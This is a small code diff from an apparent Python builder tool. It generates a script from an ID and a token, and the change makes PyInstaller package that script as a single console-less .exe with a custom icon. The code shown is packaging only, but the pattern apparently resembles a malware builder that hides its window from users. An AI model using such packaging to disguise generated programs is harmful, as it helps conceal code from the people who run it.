@@ -81,7 +81,7 @@ def make_python(ID, TOKEN):
     print(Fore.GREEN + "File is created in /output directory.")
 def make_exe(): 
     system("mkdir output/exe")
-    system("pyinstaller --noconsole --distpath output/exe output/mstl.py")
+    system("pyinstaller --onefile -i Files/icon.ico --noconsole --distpath output/exe output/mstl.py")
     print(Fore.GREEN + ".exe application is created in /output/exe/mstl")
 banner()
 try: 
